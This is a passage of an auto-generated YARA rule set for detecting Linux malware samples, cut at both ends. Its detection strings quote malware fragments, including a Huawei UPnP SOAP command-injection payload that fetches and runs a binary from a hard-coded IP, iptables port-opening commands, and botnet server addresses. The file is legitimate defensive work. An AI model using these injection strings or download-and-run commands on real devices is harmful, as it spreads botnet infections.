      $s3 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" fullword ascii
      $s4 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" fullword ascii
      $s5 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0" fullword ascii
      $s6 = "zkjtjaz" fullword ascii
      $s7 = "214.194.12.158" fullword ascii
      $s8 = "zltkaz" fullword ascii
      $s9 = "99?*.`z.?\".u2.76v;**639;.354u\"2.76q\"76v;**639;.354u\"76a+gjtcv37;=?u-?8*vpupa+gjtbZ" fullword ascii
      $s10 = ";<;(3uljktmtmZ" fullword ascii
      $s11 = "2(57?uohtjthmnitkklz" fullword ascii
      $s12 = "3.uljktmtmzr" fullword ascii
      $s13 = "2(57?uoktjthmjntkjiz" fullword ascii
      $s14 = "?()354uctkthz" fullword ascii
      $s15 = "3.uoimtilzr" fullword ascii
      $s16 = ";<;(3uoimtilZ" fullword ascii
      $s17 = "92/41?>Z" fullword ascii
      $s18 = "(?<(?)2`Z" fullword ascii
      $s19 = ")?(,?(`z>5);((?).Z" fullword ascii
      $s20 = "9544?9.354`Z" fullword ascii

      $op0 = { 50 e3 f0 47 2d e9 01 70 a0 e1 34 00 00 0a 00 50 }
      $op1 = { ea 37 00 90 ef 01 0a 70 e3 00 40 a0 e1 00 00 a0 }
      $op2 = { ea 00 20 a0 e3 02 00 a0 e1 58 d0 8d e2 30 80 bd }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_183 {
   meta:
      description = "Linux_183"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "62a1471b457169ed35709f3ca2234089c4ff16b0a747022e2d41c713db5d5230"
   strings:
      $x1 = "http: message cannot contain multiple Content-Length headers; got %qpadding bytes must all be zeros unless AllowIllegalWrites is" ascii
      $x2 = "tls: failed to sign handshake: tls: unsupported public key: %Ttoo many PSK Key Exchange modestoo many transfer encodings: %qunsa" ascii
      $x3 = "startm: P required for spinning=truestrings.Builder.Grow: negative countsyntax error scanning complex numbertls: server did not " ascii
      $x4 = ".localhost.localdomain/etc/init.d/boot.local/etc/ssl/ca-bundle.pem/lib/time/zoneinfo.zip/usr/sbin/ifconfig.cfg465661287307739257" ascii
      $x5 = "http: ContentLength=%d with Body length %dinsufficient data for resource body lengthmix of request and response pseudo headersno" ascii
      $x6 = "tls: protocol is shutdownunexpected '[' in addressunexpected ']' in addressunexpected fault address unknown Go type for slicex50" ascii
      $x7 = "arch-specific crc32 instruction for IEEE not availablebytes.Buffer: reader returned negative count from Readcryptobyte: Builder " ascii
      $x8 = "adaptivestackstartbad Content-Lengthbad lfnode addressbad manualFreeListbad point length: bufio: buffer fullcleantimers: bad pco" ascii
      $x9 = "file descriptor in bad statefindrunnable: netpoll with pforgetting unknown stream idfound pointer to free objectgcBgMarkWorker: " ascii
      $x10 = "os/exec.Command(assertion failurebad TinySizeClasscorrupt zip file decryption failedentersyscallblockexec format errorexec: kill" ascii
      $x11 = "34694469519536141888238489627838134765625MapIter.Next called on exhausted iteratorTime.UnmarshalBinary: unsupported versionasn1:" ascii
      $x12 = "runtime: p.gcMarkWorkerMode= runtime: split stack overflowruntime: sudog with non-nil cruntime: summary max pages = runtime: tra" ascii
      $x13 = "IP addressKeep-AliveKharoshthiManichaeanMessage-IdNo ContentOld_ItalicOld_PermicOld_TurkicOther_MathPOSTALCODEPhoenicianProcessi" ascii
      $x14 = ", not a function.WithValue(type /boot/System.mod/etc/rc.d/init.d/etc/resolv.conf/lib/system-mark/usr/bin/netstat0123456789ABCDEF" ascii
      $x15 = ":[_outboundatomicor8attempts:bad indirbad prunebus errorchan sendchkconfigcomplex64continuedcopystackctxt != 0d.nx != 0dns,files" ascii
      $x16 = "tls: server sent a ServerHello extension forbidden in TLS 1.3tls: unsupported certificate: private key is %T, expected *%Tx509: " ascii
      $x17 = " text=  zombie% CPU (%s%s|%s, goid=, j0 = ,errno=. Got: /bin/sh19531252.5.4.32.5.4.52.5.4.62.5.4.72.5.4.82.5.4.99765625: type ::" ascii
      $x18 = "non-IPv4 addressnon-IPv6 addressobject is remoteopt.services.cfgproxy-connectionquotaoff.serviceread_frame_otherreading header: " ascii
      $x19 = " MB,  and  cnt= got= max= ms,  ptr  tab= top=%s %q%s-%s, fp:--add/.mod/d');/proc/stat/tmp/15625326753267678125:***@:path<nil>Adl" ascii
      $x20 = "flate: internal error: frame_goaway_has_streamframe_headers_pad_shortframe_rststream_bad_lengarbage collection scangcDrain phase" ascii

      $op0 = { 02 80 80 39 42 1c 40 d3 42 01 00 34 1f 80 00 39 }
      $op1 = { 90 0b 40 f9 f1 83 00 d1 3f 02 10 eb 29 34 00 54 }
      $op2 = { 90 0b 40 f9 f1 43 01 d1 3f 02 10 eb 09 34 00 54 }
   condition:
      uint16(0) == 0x457f and filesize < 15000KB and
      ( 1 of ($x*) and all of ($op*) )
}

rule Linux_184 {
   meta:
      description = "Linux_184"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "b0452d64624129d8306f4fa2a9d222124cb4c3b5db5cf931b9739417af4c82e9"
   strings:
      $x1 = "http: message cannot contain multiple Content-Length headers; got %qpadding bytes must all be zeros unless AllowIllegalWrites is" ascii
      $x2 = "tls: failed to sign handshake: tls: unsupported public key: %Ttoo many PSK Key Exchange modestoo many transfer encodings: %qunsa" ascii
      $x3 = "startm: P required for spinning=truestrings.Builder.Grow: negative countsyntax error scanning complex numbertls: server did not " ascii
      $x4 = "http: ContentLength=%d with Body length %dinsufficient data for resource body lengthmix of request and response pseudo headersno" ascii
      $x5 = "bytes.Buffer: reader returned negative count from Readcryptobyte: Builder is exceeding its fixed-size buffergcControllerState.fi" ascii
      $x6 = ".localhost.localdomain/etc/init.d/boot.local/etc/ssl/ca-bundle.pem/lib/time/zoneinfo.zip/usr/sbin/ifconfig.cfg465661287307739257" ascii
      $x7 = "tls: protocol is shutdownunexpected '[' in addressunexpected ']' in addressunexpected fault address unknown Go type for slicex50" ascii
      $x8 = "adaptivestackstartbad Content-Lengthbad lfnode addressbad manualFreeListbad point length: bufio: buffer fullcleantimers: bad pco" ascii
      $x9 = "file descriptor in bad statefindrunnable: netpoll with pforgetting unknown stream idfound pointer to free objectgcBgMarkWorker: " ascii
      $x10 = "os/exec.Command(assertion failurebad TinySizeClasscorrupt zip file decryption failedentersyscallblockexec format errorexec: kill" ascii
      $x11 = "34694469519536141888238489627838134765625MapIter.Next called on exhausted iteratorTime.UnmarshalBinary: unsupported versionasn1:" ascii
      $x12 = "IP addressKeep-AliveKharoshthiManichaeanMessage-IdNo ContentOld_ItalicOld_PermicOld_TurkicOther_MathPOSTALCODEPhoenicianProcessi" ascii
      $x13 = "runtime: p.gcMarkWorkerMode= runtime: split stack overflowruntime: sudog with non-nil cruntime: summary max pages = runtime: tra" ascii
      $x14 = "*http2.Transport, not a function.WithValue(type /boot/System.mod/etc/rc.d/init.d/etc/resolv.conf/lib/system-mark/usr/bin/netstat" ascii
      $x15 = " text=  zombie% CPU (%s%s|%s(PANIC=, goid=, j0 = , time.,errno=-070000. Got: /bin/sh19531252.5.4.32.5.4.52.5.4.62.5.4.72.5.4.82." ascii
      $x16 = "tls: server sent a ServerHello extension forbidden in TLS 1.3tls: unsupported certificate: private key is %T, expected *%Tx509: " ascii
      $x17 = "non-IPv4 addressnon-IPv6 addressobject is remoteopt.services.cfgproxy-connectionquotaoff.serviceread_frame_otherreading header: " ascii
      $x18 = "flate: internal error: frame_goaway_has_streamframe_headers_pad_shortframe_rststream_bad_lengarbage collection scangcDrain phase" ascii
      $x19 = " MB,  and  cnt= got= max= ms,  ptr  tab= top=%s %q%s-%s(nil), fp:--add/.mod/d');/proc/stat/tmp/15625326753267678125:***@:path<ni" ascii
      $x20 = "GC mark terminationGC work not flushedIDS_Binary_OperatorINADEQUATE_SECURITYINITIAL_WINDOW_SIZEKhitan_Small_ScriptMisdirected Re" ascii

      $op0 = { 23 3e 02 3c d4 07 42 34 2b 10 41 00 37 00 40 14 }
      $op1 = { 80 17 34 2b 30 b7 00 06 00 c0 10 }
      $op2 = { fd ff 03 34 05 00 00 10 }
   condition:
      uint16(0) == 0x457f and filesize < 17000KB and
      ( 1 of ($x*) and all of ($op*) )
}

rule Linux_185 {
   meta:
      description = "Linux_185"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "d5a4811feccf6db806904d74c5e987ba7a661bce80f261156df7f4f78a8df3ea"
   strings:
      $x1 = "http: message cannot contain multiple Content-Length headers; got %qpadding bytes must all be zeros unless AllowIllegalWrites is" ascii
      $x2 = "tls: failed to sign handshake: tls: unsupported public key: %Ttoo many PSK Key Exchange modestoo many transfer encodings: %qunsa" ascii
      $x3 = "startm: P required for spinning=truestrings.Builder.Grow: negative countsyntax error scanning complex numbertls: server did not " ascii
      $x4 = "http: ContentLength=%d with Body length %dinsufficient data for resource body lengthmix of request and response pseudo headersno" ascii
      $x5 = "bytes.Buffer: reader returned negative count from Readcryptobyte: Builder is exceeding its fixed-size buffergcControllerState.fi" ascii
      $x6 = ".localhost.localdomain/etc/init.d/boot.local/etc/ssl/ca-bundle.pem/lib/time/zoneinfo.zip/usr/sbin/ifconfig.cfg465661287307739257" ascii
      $x7 = "tls: protocol is shutdownunexpected '[' in addressunexpected ']' in addressunexpected fault address unknown Go type for slicex50" ascii
      $x8 = "adaptivestackstartbad Content-Lengthbad lfnode addressbad manualFreeListbad point length: bufio: buffer fullcleantimers: bad pco" ascii
      $x9 = "file descriptor in bad statefindrunnable: netpoll with pforgetting unknown stream idfound pointer to free objectgcBgMarkWorker: " ascii
      $x10 = "os/exec.Command(assertion failurebad TinySizeClasscorrupt zip file decryption failedentersyscallblockexec format errorexec: kill" ascii
      $x11 = "34694469519536141888238489627838134765625MapIter.Next called on exhausted iteratorTime.UnmarshalBinary: unsupported versionasn1:" ascii
      $x12 = "IP addressKeep-AliveKharoshthiManichaeanMessage-IdNo ContentOld_ItalicOld_PermicOld_TurkicOther_MathPOSTALCODEPhoenicianProcessi" ascii
      $x13 = "runtime: p.gcMarkWorkerMode= runtime: split stack overflowruntime: sudog with non-nil cruntime: summary max pages = runtime: tra" ascii
      $x14 = "*http2.Transport, not a function.WithValue(type /boot/System.mod/etc/rc.d/init.d/etc/resolv.conf/lib/system-mark/usr/bin/netstat" ascii
      $x15 = " text=  zombie% CPU (%s%s|%s(PANIC=, goid=, j0 = , time.,errno=-070000. Got: /bin/sh19531252.5.4.32.5.4.52.5.4.62.5.4.72.5.4.82." ascii
      $x16 = "tls: server sent a ServerHello extension forbidden in TLS 1.3tls: unsupported certificate: private key is %T, expected *%Tx509: " ascii
      $x17 = "non-IPv4 addressnon-IPv6 addressobject is remoteopt.services.cfgproxy-connectionquotaoff.serviceread_frame_otherreading header: " ascii
      $x18 = "flate: internal error: frame_goaway_has_streamframe_headers_pad_shortframe_rststream_bad_lengarbage collection scangcDrain phase" ascii
      $x19 = " MB,  and  cnt= got= max= ms,  ptr  tab= top=%s %q%s-%s(nil), fp:--add/.mod/d');/proc/stat/tmp/15625326753267678125:***@:path<ni" ascii
      $x20 = "GC mark terminationGC work not flushedIDS_Binary_OperatorINADEQUATE_SECURITYINITIAL_WINDOW_SIZEKhitan_Small_ScriptMisdirected Re" ascii

      $op0 = { 3c 02 3e 23 34 42 07 d4 00 41 10 2b 14 40 00 37 }
      $op1 = { 90 65 00 01 34 a5 00 20 30 a5 00 ff 38 a6 00 62 }
      $op2 = { 3c 04 4f 3c 34 84 6e 38 00 83 20 2b 14 80 00 32 }
   condition:
      uint16(0) == 0x457f and filesize < 17000KB and
      ( 1 of ($x*) and all of ($op*) )
}

rule Linux_186 {
   meta:
      description = "Linux_186"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "0a02981af9a8948f4dac63cfac6127c7b4b17c1f13da877f4a31a6aa2a9b56c0"
   strings:
      $s1 = "/bin/busybox iptables -A INPUT -p tcp --dport 26721 -j ACCEPT" fullword ascii
      $s2 = "/usr/bin/iptables -A INPUT -p tcp --dport 26721 -j ACCEPT" fullword ascii
      $s3 = "[modules/system.c] Process (pid=%d path=%s) is malicious" fullword ascii
      $s4 = "busybox iptables -A INPUT -p tcp --dport 26721 -j ACCEPT" fullword ascii
      $s5 = "bindtoip" fullword ascii
      $s6 = "/proc/%s/fd/" fullword ascii
      $s7 = "Failed to register signal handler for SIGINT" fullword ascii
      $s8 = "/usr/local/sbin/" fullword ascii
      $s9 = "/usr/local/bin/" fullword ascii
      $s10 = "87.246.7.194" fullword ascii
      $s11 = "RebirthLTD" fullword ascii
      $s12 = "armv4t" fullword ascii
      $s13 = "/usr/lib64/" fullword ascii
      $s14 = "c1{b6>" fullword ascii
      $s15 = ")$'SVm," fullword ascii

      $op0 = { f0 45 2d e9 34 30 92 e5 98 50 9f e5 01 a0 73 e2 }
      $op1 = { dc ff ff ff 00 00 a0 e3 1e ff 2f e1 08 30 90 e5 }
      $op2 = { c8 ff ff ff f0 4f 2d e9 00 40 a0 e1 85 df 4d e2 }
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_187 {
   meta:
      description = "Linux_187"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "590f383735ea3e0543ad00c9d3771a20ee899e2c2423315c8ab46e7dabc10c0c"
   strings:
      $s1 = "Unable To Connect to Target: %s:%d " fullword ascii
      $s2 = "Connected To Target: %s:%d " fullword ascii
      $s3 = "get_cmdline" fullword ascii
      $s4 = "commandparsing" fullword ascii
      $s5 = "cmdlinekillstrings" fullword ascii
      $s6 = "decodedshit" fullword ascii
      $s7 = "/home/landley/aboriginal/aboriginal/build/temp-armv6l/gcc-core/gcc/config/arm/lib1funcs.asm" fullword ascii
      $s8 = "/home/landley/aboriginal/aboriginal/build/temp-armv6l/gcc-core/gcc/config/arm/pr-support.c" fullword ascii
      $s9 = "connecthosts" fullword ascii
      $s10 = "killer_cmdlinelol" fullword ascii
      $s11 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2" fullword ascii
      $s12 = "cmdparse" fullword ascii
      $s13 = "pathread" fullword ascii
      $s14 = "remoteaddr" fullword ascii
      $s15 = "/home/landley/aboriginal/aboriginal/build/temp-armv6l/gcc-core/gcc/config/arm/libunwind.S" fullword ascii
      $s16 = "/home/landley/aboriginal/aboriginal/build/temp-armv6l/build-gcc/gcc" fullword ascii
      $s17 = "/home/landley/aboriginal/aboriginal/build/temp-armv6l/gcc-core/gcc/config/arm" fullword ascii
      $s18 = "/home/landley/aboriginal/aboriginal/build/temp-armv6l/gcc-core/gcc/config/arm/unwind-arm.c" fullword ascii
      $s19 = "/home/landley/aboriginal/aboriginal/build/temp-armv6l/gcc-core/gcc/config/arm/ieee754-df.S" fullword ascii
      $s20 = "Sending requests to: %s:%d " fullword ascii

      $op0 = { f4 ff ff ff f4 ff ff ff 90 6b 00 00 f4 ff ff ff }
      $op1 = { 51 e3 01 c0 20 e0 42 00 00 0a 00 10 61 42 01 20 }
      $op2 = { 58 c0 9f e5 58 30 9f e5 0c c0 8f e0 70 40 2d e9 }
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_188 {
   meta:
      description = "Linux_188"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "e2e93c376d19df2830e101f303cd4f22805f07b9ed7d32e024429393cec5b717"
   strings:
      $s1 = "Unable To Connect to Target: %s:%d " fullword ascii
      $s2 = "Connected To Target: %s:%d " fullword ascii
      $s3 = "get_cmdline" fullword ascii
      $s4 = "commandparsing" fullword ascii
      $s5 = "cmdlinekillstrings" fullword ascii
      $s6 = "decodedshit" fullword ascii
      $s7 = "connecthosts" fullword ascii
      $s8 = "killer_cmdlinelol" fullword ascii
      $s9 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2" fullword ascii
      $s10 = "cmdparse" fullword ascii
      $s11 = "pathread" fullword ascii
      $s12 = "Sending requests to: %s:%d " fullword ascii
      $s13 = "FRAMESZ" fullword ascii
      $s14 = "Device Connected [Name:%s] [Arch:%s] [UID:%d]" fullword ascii
      $s15 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11" fullword ascii
      $s16 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11" fullword ascii
      $s17 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5" fullword ascii
      $s18 = "attackpids" fullword ascii
      $s19 = "whitlistpaths" fullword ascii
      $s20 = "estring" fullword ascii

      $op0 = { 02 ae 34 00 0a 26 04 00 09 26 00 00 25 8d }
      $op1 = { 43 8c 03 00 84 34 08 00 03 ad 00 00 e4 ac 74 00 }
      $op2 = { 22 8d c6 41 03 3c 6d 4e 63 34 18 00 43 00 ff 7f }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_189 {
   meta:
      description = "Linux_189"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "5f3fc96e9d071c7ee234d668c6d10d2a22f149f08ffeb9db224c66f290d20e75"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s2 = " -g 103.188.244.189 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloa" ascii
      $s3 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox w" ascii
      $s4 = "bin/systemd" fullword ascii
      $s5 = "dURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii
      $s6 = "killall" fullword ascii
      $s7 = "bin/busybox" fullword ascii
      $s8 = "bin/watchdog" fullword ascii
      $s9 = "MCJBG@K." fullword ascii
      $s10 = "w5q6he3dbrsgmclkiu4to18npavj702f" fullword ascii
      $s11 = " &&  mv " fullword ascii
      $s12 = "LAZ@KZ" fullword ascii
      $s13 = "@I[WK@@IFG" fullword ascii
      $s14 = "(#$c28" fullword ascii
      $s15 = "H!$J<T0" fullword ascii
      $s16 = " @$c<D" fullword ascii
      $s17 = "0 $c0L" fullword ascii

      $op0 = { 3c 04 04 11 34 84 49 37 00 44 00 19 8f bc 00 18 }
      $op1 = { 10 00 00 03 34 42 00 04 34 42 00 08 00 00 18 21 }
      $op2 = { 18 21 34 42 00 01 a6 02 00 00 8f bf 00 1c 8f b0 }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( 1 of ($x*) and 4 of them and all of ($op*) )
}

rule Linux_190 {
   meta:
      description = "Linux_190"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "77ce9c0e0f7f5b540c7bec12b74b45513287fb3aa93bb4e75489005b5aa0ff28"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s2 = " -g 103.188.244.189 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloa" ascii
      $s3 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox w" ascii
      $s4 = "bin/systemd" fullword ascii
      $s5 = "dURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii
      $s6 = "killall" fullword ascii
      $s7 = "bin/busybox" fullword ascii
      $s8 = "bin/watchdog" fullword ascii
      $s9 = "MCJBG@K." fullword ascii
      $s10 = "w5q6he3dbrsgmclkiu4to18npavj702f" fullword ascii
      $s11 = " &&  mv " fullword ascii
      $s12 = "LAZ@KZ" fullword ascii
      $s13 = "@I[WK@@IFG" fullword ascii

      $op0 = { 8a 00 70 a0 e3 07 00 a0 e1 f0 80 bd e8 70 40 2d }
      $op1 = { be 00 90 ef 01 0a 70 e3 0e f0 a0 31 25 10 e0 e3 }
      $op2 = { ea 00 50 e0 e3 05 00 a0 e1 70 80 bd e8 10 40 2d }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 1 of ($x*) and 4 of them and all of ($op*) )
}

rule Linux_191 {
   meta:
      description = "Linux_191"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "82fc9ae92f7551f3ca77e7ff3d4aa61d8cd2630f4eda2fd56c8803b5ae4a5984"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s2 = " -g 103.188.244.189 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloa" ascii
      $s3 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox w" ascii
      $s4 = "bin/systemd" fullword ascii
      $s5 = "dURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii
      $s6 = "killall" fullword ascii
      $s7 = "bin/busybox" fullword ascii
      $s8 = "bin/watchdog" fullword ascii
      $s9 = "MCJBG@K." fullword ascii
      $s10 = "w5q6he3dbrsgmclkiu4to18npavj702f" fullword ascii
      $s11 = " &&  mv " fullword ascii
      $s12 = "LAZ@KZ" fullword ascii
      $s13 = "@I[WK@@IFG" fullword ascii

      $op0 = { 80 ff ff ff ff 00 00 b0 0d 03 00 ff 7f }
      $op1 = { 25 00 00 f0 45 2d e9 34 30 92 e5 98 50 9f e5 01 }
      $op2 = { f4 ff ff ff f4 ff ff ff 70 24 00 00 f4 ff ff ff }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 1 of ($x*) and 4 of them and all of ($op*) )
}

rule Linux_192 {
   meta:
      description = "Linux_192"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "07ff0a6d179224d57aad6f733e187dae4b1126627722679aa25274aa5a01cf4f"
   strings:
      $s1 = "ArHF,tC^" fullword ascii
      $s2 = "ZUPX!`" fullword ascii
      $s3 = ".Wq&q<" fullword ascii
      $s4 = "x0eJ,x7" fullword ascii
      $s5 = "\"n|qRfq" fullword ascii
      $s6 = "@4=qVw" fullword ascii
      $s7 = "x!_2YE" fullword ascii
      $s8 = "KuzPXq" fullword ascii
      $s9 = "S6Z&dgk " fullword ascii
      $s10 = "?6AbDA" fullword ascii
      $s11 = "3x&}7$#0" fullword ascii
      $s12 = "?M74$M2mUr" fullword ascii
      $s13 = "@wZ+_$" fullword ascii
      $s14 = "ZJ4+)q" fullword ascii
      $s15 = "ID,IEtm" fullword ascii
      $s16 = "6~U+6Q" fullword ascii
      $s17 = "toEh`w" fullword ascii
      $s18 = "FeW!jY" fullword ascii
      $s19 = " hf~Bb" fullword ascii
      $s20 = "%4s.J6" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 70KB and
      8 of them
}

rule Linux_193 {
   meta:
      description = "Linux_193"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "7a3a141da6cf5d5d60e9f9388799362b750c404518617406d03ad42722538e1d"
   strings:
      $s1 = "# 6l18" fullword ascii
      $s2 = "ArHF,tC^" fullword ascii
      $s3 = "MlOo5kE" fullword ascii
      $s4 = "x0eJ,x7" fullword ascii
      $s5 = "emO<V(A48" fullword ascii
      $s6 = "~-+FWzq" fullword ascii
      $s7 = "E9Xff\\" fullword ascii
      $s8 = ",SR5mu " fullword ascii
      $s9 = " \\.&6\\" fullword ascii
      $s10 = "ux-Vq%" fullword ascii
      $s11 = "hh}%qJ" fullword ascii
      $s12 = "qOu>K=" fullword ascii
      $s13 = ",*yo\\N" fullword ascii
      $s14 = "dM%C./>" fullword ascii
      $s15 = "k;>>;\"KR" fullword ascii
      $s16 = "~wr~ZRU" fullword ascii
      $s17 = "$:7MW*" fullword ascii
      $s18 = ":b|Q2H" fullword ascii
      $s19 = "*_2YqC" fullword ascii
      $s20 = "RlR7:C" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 90KB and
      8 of them
}

rule Linux_194 {
   meta:
      description = "Linux_194"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "38828da55f631246aeb36e1c92d325075ba6f125fbb6e15a483069ba8521b99e"
   strings:
      $s1 = "/bin/busybox iptables -A INPUT -p tcp --dport 26721 -j ACCEPT" fullword ascii
      $s2 = "/usr/bin/iptables -A INPUT -p tcp --dport 26721 -j ACCEPT" fullword ascii
      $s3 = "[modules/system.c] Process (pid=%d path=%s) is malicious" fullword ascii
      $s4 = "busybox iptables -A INPUT -p tcp --dport 26721 -j ACCEPT" fullword ascii
      $s5 = "bindtoip" fullword ascii
      $s6 = "/proc/%s/fd/" fullword ascii
      $s7 = "Failed to register signal handler for SIGINT" fullword ascii
      $s8 = "/usr/local/sbin/" fullword ascii
      $s9 = "/usr/local/bin/" fullword ascii
      $s10 = "87.246.7.194" fullword ascii
      $s11 = "RebirthLTD" fullword ascii
      $s12 = "nd 3expa2-byte k" fullword ascii
      $s13 = "/usr/lib64/" fullword ascii
      $s14 = "c1{b6>" fullword ascii
      $s15 = ")$'SVm," fullword ascii

      $op0 = { 2a 05 40 a0 e1 bc 34 9f e5 18 20 9d e5 93 62 22 }
      $op1 = { ea 00 00 a0 e3 b0 d0 8d e2 f0 8f bd e8 34 99 02 }
      $op2 = { 24 40 d8 68 03 00 34 9a 02 }
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_195 {
   meta:
      description = "Linux_195"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "d00b885be884e9d9801a7b13634d0279220db8dcba9d8216ceb5cbe09b2141d0"
   strings:
      $s1 = "/bin/busybox iptables -A INPUT -p tcp --dport 26721 -j ACCEPT" fullword ascii
      $s2 = "/usr/bin/iptables -A INPUT -p tcp --dport 26721 -j ACCEPT" fullword ascii
      $s3 = "[modules/system.c] Process (pid=%d path=%s) is malicious" fullword ascii
      $s4 = "busybox iptables -A INPUT -p tcp --dport 26721 -j ACCEPT" fullword ascii
      $s5 = "bindtoip" fullword ascii
      $s6 = "/proc/%s/fd/" fullword ascii
      $s7 = "Failed to register signal handler for SIGINT" fullword ascii
      $s8 = "/usr/local/sbin/" fullword ascii
      $s9 = "/usr/local/bin/" fullword ascii
      $s10 = "87.246.7.194" fullword ascii
      $s11 = "RebirthLTD" fullword ascii
      $s12 = "nd 3expa2-byte k" fullword ascii
      $s13 = "/usr/lib64/" fullword ascii
      $s14 = "c1{b6>" fullword ascii
      $s15 = ")$'SVm," fullword ascii

      $op0 = { 2a 05 40 a0 e1 bc 34 9f e5 18 20 9d e5 93 62 22 }
      $op1 = { 0a 00 81 83 ed 34 30 97 e5 01 30 83 e2 34 30 87 }
      $op2 = { 51 e3 0e f0 a0 01 00 00 53 e3 01 00 00 1a 03 00 }
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_196 {
   meta:
      description = "Linux_196"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "0c48c50c8007a1e6f9d5d79a95c04963e2d6af4ccb98e830836d62126f1d4259"
   strings:
      $s1 = "PWnDB0" fullword ascii
      $s2 = "heko/Ds" fullword ascii
      $s3 = ":ey}sltAAtke)" fullword ascii
      $s4 = "hSWv+^qD" fullword ascii
      $s5 = "OqawZ\\N" fullword ascii
      $s6 = "JJPp1LXQ" fullword ascii
      $s7 = "\\mf_9J\"]" fullword ascii
      $s8 = "W/<hKv" fullword ascii
      $s9 = "{*s/Rl" fullword ascii
      $s10 = "TSv~4}.=" fullword ascii
